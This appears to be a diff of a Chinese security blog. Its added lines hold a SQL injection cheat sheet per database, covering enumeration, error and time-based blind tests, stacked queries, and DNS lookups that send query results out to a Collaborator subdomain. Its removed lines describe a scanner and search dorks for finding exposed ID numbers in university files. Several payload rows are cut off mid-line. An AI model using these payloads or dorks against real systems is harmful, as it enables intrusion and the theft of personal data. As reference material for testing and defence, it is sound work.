+<h1 id="Comments-注释"><a href="#Comments-注释" class="headerlink" title="Comments 注释"></a>Comments 注释</h1><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>--comment</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
+</tr>
+</tbody></table>
 <hr>
-<h2 id="提取内容函数："><a href="#提取内容函数：" class="headerlink" title="提取内容函数："></a>提取内容函数：</h2><p><img src="https://i.loli.net/2019/05/06/5cd0550f672ff.png" alt=""></p>
-<p>亮点:</p>
+<h1 id="Database-version-数据库版本"><a href="#Database-version-数据库版本" class="headerlink" title="Database version 数据库版本"></a>Database version 数据库版本</h1><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT version()</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT @@version</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Database-contents-数据库内容"><a href="#Database-contents-数据库内容" class="headerlink" title="Database contents 数据库内容"></a>Database contents 数据库内容</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Conditional-errors-条件错误"><a href="#Conditional-errors-条件错误" class="headerlink" title="Conditional errors 条件错误"></a>Conditional errors 条件错误</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Batched-or-stacked-queries-批量查询"><a href="#Batched-or-stacked-queries-批量查询" class="headerlink" title="Batched (or stacked) queries 批量查询"></a>Batched (or stacked) queries 批量查询</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>Does not support batched queries.</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>Does not support batched queries.</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Time-delays-时间延迟"><a href="#Time-delays-时间延迟" class="headerlink" title="Time delays 时间延迟"></a>Time delays 时间延迟</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT pg_sleep(10)</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT sleep(10)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Conditional-time-delays-有条件的时间延迟"><a href="#Conditional-time-delays-有条件的时间延迟" class="headerlink" title="Conditional time delays 有条件的时间延迟"></a>Conditional time delays 有条件的时间延迟</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#39;a&#39;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="DNS-lookup-DNS查询"><a href="#DNS-lookup-DNS查询" class="headerlink" title="DNS lookup DNS查询"></a>DNS lookup DNS查询</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left">The following techniques work on Windows only:<br><code>LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><a href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找" class="headerlink" title="DNS lookup with data exfiltration 使用数据泄露进行DNS查找"></a>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">`SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM “http://‘</td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘</td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
 <ul>
-<li>TEXT文本的处理</li>
+<li>String concatenation 字符串连接</li>
+<li>Comments 注释</li>
+<li>Database version 数据库版本的查询</li>
+<li>Database contents 数据库内容的查询</li>
+<li>Conditional errors 条件错误</li>
+<li>Batched (or stacked) queries 批量查询</li>
+<li>Time delays 时间延迟</li>
+<li>Conditional time delays 有条件的时间延迟</li>
+<li>DNS lookup DNS查询<br>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</li>
 </ul>
 <hr>
-<h2 id="基于报错的测试"><a href="#基于报错的测试" class="headerlink" title="基于报错的测试:"></a>基于报错的测试:</h2><p><img src="https://i.loli.net/2019/05/06/5cd0557531ada.png" alt=""></p>
-<hr>
-<h2 id="基于布尔的测试"><a href="#基于布尔的测试" class="headerlink" title="基于布尔的测试:"></a>基于布尔的测试:</h2><p><img src="https://i.loli.net/2019/05/06/5cd05595e835e.png" alt=""></p>
-<p>在页面文本相似度那里,对于0.95那个理解有点费劲,提了个<a href="https://github.com/stamparm/DSSS/issues/8" target="_blank" rel="noopener">issue</a>问作者.</p>
-<p>作者很nice,也很快就回复我了。我才get到它这里面的判断有2种:精确判断和模糊判断.</p>
-<p>精确判断：可以通过<code>HTTP-CODE</code>和<code>TITLE</code>来判断两个页面是否是100%一样</p>
-<p>模糊判断: 通过<code>quick_ratio</code>来计算两个页面的文本相似度,因为<code>quick_ratio</code>计算有时不太准确,有一定的误差,故<code>FUZZY_THRESHOLD = 0.95</code>设置如此,留了5%做误差.</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/25/WPSIH-网站个人敏感信息文件扫描器-开发记录/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Foolisheddy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Black House">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/25/WPSIH-网站个人敏感信息文件扫描器-开发记录/" itemprop="url">WPSIH-网站个人敏感信息文件扫描器-开发记录</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-25T14:36:34+08:00">
-                2019-04-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/SecurityTools/" itemprop="url" rel="index">
-                    <span itemprop="name">SecurityTools</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="项目名-WPSIH"><a href="#项目名-WPSIH" class="headerlink" title="项目名:WPSIH"></a>项目名:WPSIH</h1><p>Website Sensitive Personal Information Hunter-网站个人敏感信息文件扫描器</p>
-<p><img src="https://i.loli.net/2019/04/28/5cc5b3a24036a.png" alt=""></p>
-<p>项目地址:<a href="https://github.com/jerrychan807/WSPIH" target="_blank" rel="noopener">WSPIH</a></p>
-<hr>
-<h1 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果:"></a>运行效果:</h1><p><img src="https://i.loli.net/2019/04/30/5cc72451486a1.png" alt=""></p>
-<hr>
-<h1 id="程序执行逻辑"><a href="#程序执行逻辑" class="headerlink" title="程序执行逻辑:"></a>程序执行逻辑:</h1><p><img src="https://i.loli.net/2019/04/29/5cc71ada6c08d.png" alt=""></p>
-<hr>
-<h2 id="爬取链接"><a href="#爬取链接" class="headerlink" title="爬取链接:"></a>爬取链接:</h2><p>需要过滤掉一些无用的后缀名:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IGNORED_EXTESIONS = [&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;jpeg&quot;, &quot;woff&quot;, &quot;ttf&quot;, &quot;eot&quot;, &quot;svg&quot;, &quot;woff2&quot;, &quot;ico&quot;]</span><br></pre></td></tr></table></figure>
-
-<p>并筛选出需要的后缀名,然后保存下来:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXCEL_EXTENSIONS = [&quot;xls&quot;, &quot;xlsx&quot;]</span><br><span class="line">PDF_EXTENSIONS = [&quot;pdf&quot;]</span><br><span class="line">WORD_EXTENSIONS = [&quot;doc&quot;, &quot;docx&quot;]</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="解析文本内容"><a href="#解析文本内容" class="headerlink" title="解析文本内容:"></a>解析文本内容:</h2><p>ExcelParser:</p>
-<ul>
-<li>使用<code>xlrd</code>模块</li>
-</ul>
-<p>PdfParser：</p>
-<ul>
-<li>使用<code>pdfminer</code>模块</li>
-<li>无法检测图片中是否存在敏感信息；</li>
-</ul>
-<p>WordParser:</p>
-<ul>
-<li>使用<code>python-docx</code>模块</li>
-<li>无法检测图片中是否存在敏感信息；</li>
-<li>只支持.docx</li>
-</ul>
-<blockquote>
-<p><code>doc</code>后缀的,需要在wins环境下转换成<code>docx</code>后缀,然后才能解析.遂放弃.</p>
-</blockquote>
-<hr>
-<h2 id="基于正则匹配敏感信息"><a href="#基于正则匹配敏感信息" class="headerlink" title="基于正则匹配敏感信息"></a>基于正则匹配敏感信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHONE_REGEX = r&apos;^(?:\+?86)?1(?:3\d&#123;3&#125;|5[^4\D]\d&#123;2&#125;|8\d&#123;3&#125;|7(?:[35678]\d&#123;2&#125;|4(?:0\d|1[0-2]|9\d))|9[189]\d&#123;2&#125;|66\d&#123;2&#125;)\d&#123;6&#125;$&apos;</span><br><span class="line"></span><br><span class="line">EMAIL_REGEX = r&apos;^\w+@(\w+\.)+\w+&apos;</span><br><span class="line"></span><br><span class="line">IDCARD_REGEX = r&apos;^[1-9]\d&#123;5&#125;(18|19|20)\d&#123;2&#125;((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d&#123;3&#125;[0-9Xx]&apos;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>手机号码的正则一开始没在后面加上<code>$</code>符号(<code>$</code>是正则表达式匹配字符串结束位置),因为一开始在简单测试excel里的手机号码的时候,发现有这种情况:<code>13424324567.0</code>,所以唐突的把<code>$</code>去掉了.</p>
-<p>这种就是没有经过大量测试的后果.</p>
-<p>导致产生了很多误报. 可见正则大法好,但是要<strong>深刻理解和正确使用</strong>.不然误报太多了.</p>
-</blockquote>
-<hr>
-<h1 id="一些有趣的点"><a href="#一些有趣的点" class="headerlink" title="一些有趣的点:"></a>一些有趣的点:</h1><h2 id="隐藏起来的敏感信息"><a href="#隐藏起来的敏感信息" class="headerlink" title="隐藏起来的敏感信息:"></a>隐藏起来的敏感信息:</h2><p>有些文件是能匹配出敏感结果的,但是实际上你去打开那个文件,你会找不到结果.举例如下:</p>
-<ul>
-<li>excel的隐藏列:</li>
-</ul>
-<p><img src="https://i.loli.net/2019/04/29/5cc71c1146490.png" alt=""></p>
-<ul>
-<li>excel的折叠列:</li>
-</ul>
-<p>拉开前:</p>
-<p><img src="https://i.loli.net/2019/04/30/5cc736e3b72a8.png" alt=""></p>
-<p>看图上的绿色线,是把内容折叠了起来</p>
-<p>实际上把绿色线拉开之后,确实是存在敏感信息的.</p>
-<p><img src="https://i.loli.net/2019/04/30/5cc736f97350d.png" alt=""></p>
-<hr>
-<h2 id="在书里找到了敏感信息"><a href="#在书里找到了敏感信息" class="headerlink" title="在书里找到了敏感信息:"></a>在书里找到了敏感信息:</h2><p>在一本书里,匹配到了邮箱…估计是作者、出版社的联系方式..</p>
-<p><img src="https://i.loli.net/2019/04/30/5cc721bf2ce18.jpg" alt=""></p>
-<p>尴尬…</p>
-<hr>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h1><h2 id="已解决的Bug"><a href="#已解决的Bug" class="headerlink" title="已解决的Bug:"></a>已解决的Bug:</h2><h3 id="把命令写死了"><a href="#把命令写死了" class="headerlink" title="把命令写死了:"></a>把命令写死了:</h3><p><img src="https://i.loli.net/2019/04/30/5cc7233328377.png" alt=""></p>
-<blockquote>
-<p>不同环境下的python执行路径是不同的…</p>
-</blockquote>
-<hr>
-<h3 id="跨平台运行的问题"><a href="#跨平台运行的问题" class="headerlink" title="跨平台运行的问题:"></a>跨平台运行的问题:</h3><p>比如wins下没有<code>find</code>命令,要用<code>for</code></p>
-<blockquote>
-<p>跨平台运行是个令人头疼的问题呀..会有很多意想不到的结果出现.</p>
-</blockquote>
-<hr>
-<h3 id="减少模板类文件的误报"><a href="#减少模板类文件的误报" class="headerlink" title="减少模板类文件的误报:"></a>减少模板类文件的误报:</h3><p>如模板类,解决办法: 通过数量判定,例如从某个文件收集到的邮箱少于2个.则认为这是个模板类文件.</p>
-<p>举例:</p>
-<p><img src="https://i.loli.net/2019/04/28/5cc5c4a676f30.png" alt=""><br><img src="https://i.loli.net/2019/04/28/5cc5c5113bb70.png" alt=""></p>
-<hr>
-<h1 id="待改进的地方"><a href="#待改进的地方" class="headerlink" title="待改进的地方:"></a>待改进的地方:</h1><hr>
-<h2 id="更多的正则匹配"><a href="#更多的正则匹配" class="headerlink" title="更多的正则匹配:"></a>更多的正则匹配:</h2><p>for Chinese:</p>
-<ul>
-<li>支付宝账号</li>
-<li>社保账号</li>
-<li>银行卡号</li>
-<li>身份证</li>
-<li>护照</li>
-<li>香港永久性居民身份证</li>
-<li>澳门永久性居民身份证</li>
-<li>台湾居民来往大陆通行证</li>
-<li>军官证</li>
-</ul>
-<p>for Foreign:</p>
-<ul>
-<li>外国手机号</li>
-<li>外国身份证号码</li>
-</ul>
-<blockquote>
-<p>估计也没时间去完善hhh</p>
-</blockquote>
-<hr>
-<h2 id="基于关键字匹配"><a href="#基于关键字匹配" class="headerlink" title="基于关键字匹配:"></a>基于关键字匹配:</h2><ul>
-<li>身份证</li>
-<li>身份证号</li>
-<li>身份证号码</li>
-<li>身份证件号码</li>
-<li>证件号码 </li>
-<li>zjhm</li>
-<li>证件类型</li>
-<li>证书号码</li>
-<li>手机</li>
-<li>联系电话</li>
-<li>联系方式</li>
-<li>电子邮箱</li>
-<li>dzly</li>
-<li>通信地址</li>
-<li>家庭地址</li>
-</ul>
-<blockquote>
-<p>预期使用关键词匹配的话,误报会很多,只适用于excel类型的表头.</p>
-</blockquote>
-<hr>
-<h2 id="动态链接下载"><a href="#动态链接下载" class="headerlink" title="动态链接下载:"></a>动态链接下载:</h2><ul>
-<li><code>http://yjsy.uibe.edu.cn/common/downloadFile.jsp?id=119295</code></li>
-<li><code>http://yz.nwafu.edu.cn/common/rtfeditor/openfile.jsp?id=DBCPDBDDDFDIDBCPDADBDGCOHIGMHD</code></li>
-</ul>
-<p>类似以上这种url,要访问动态链接,服务器才会返回文件的url地址.</p>
-<p>目前是处理不了这种情况.</p>
-<blockquote>
-<p>搜索引擎是可以爬取到这类url的文件的<br>预计解决办法是:1.要用上无头浏览器等技术.模拟发包是不行的 2.直接访问该url并下载文件.</p>
-</blockquote>
-<hr>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h1><hr>
-<h2 id="测试服务器"><a href="#测试服务器" class="headerlink" title="测试服务器:"></a>测试服务器:</h2><p><img src="https://i.loli.net/2019/04/30/5cc732ed512d9.jpg" alt=""></p>
-<p>跑到机子模糊…</p>
-<p><img src="https://i.loli.net/2019/04/30/5cc7330875dcd.jpg" alt=""></p>
-<hr>
-<h2 id="搜索引擎hack"><a href="#搜索引擎hack" class="headerlink" title="搜索引擎hack:"></a>搜索引擎hack:</h2><p>百度:</p>
-<p><code>site:*.edu.cn filetype:xls</code><br><code>site:*.edu.cn filetype:xls 身份证</code></p>
-<p>google:</p>
-<p><code>site:*.edu.cn filetype:xls</code></p>
-<blockquote>
-<p>主要是用于前期寻找测试文件</p>
-</blockquote>
-<hr>
-<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点:"></a>注意点:</h2><p>我已知的,目前<code>edu-src</code>判定是敏感文件的范围是:</p>
-<ul>
-<li>个人手机</li>
-<li>个人住址</li>
-<li><del>个人邮箱</del> (目前不收了)</li>
-<li><strong>身份证</strong></li>
-</ul>
-<p>不属于的范围:</p>
-<ul>
-<li>工作邮箱</li>
-<li>准考证号</li>
-</ul>
-<blockquote>
-<p>知道规则也很重要..hhh</p>
-</blockquote>
-<hr>
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h2><ul>
-<li>作为信息公示的话,身份证显示后六位或者打码显示即可</li>
-<li>如无必要,不要上传到公网上.</li>
-</ul>
-<hr>
-<h1 id="Contributors"><a href="#Contributors" class="headerlink" title="Contributors:"></a>Contributors:</h1><ul>
-<li>JackChan1024</li>
-</ul>
-<blockquote>
-<p>hacking together , is so cool…</p>
-</blockquote>
-<hr>
-<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
-<li><a href="https://jingyan.baidu.com/article/148a192191dc9a4d71c3b11c.html" target="_blank" rel="noopener">excel中如何隐藏列和取消隐藏列</a></li>
-<li><a href="https://github.com/tijme/not-your-average-web-crawler" target="_blank" rel="noopener">not-your-average-web-crawler</a> 这是个很棒的爬虫框架.</li>
+<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
+<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL injection cheat sheet</a></li>
 </ul>
 
           
@@ -2523,7 +2424,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
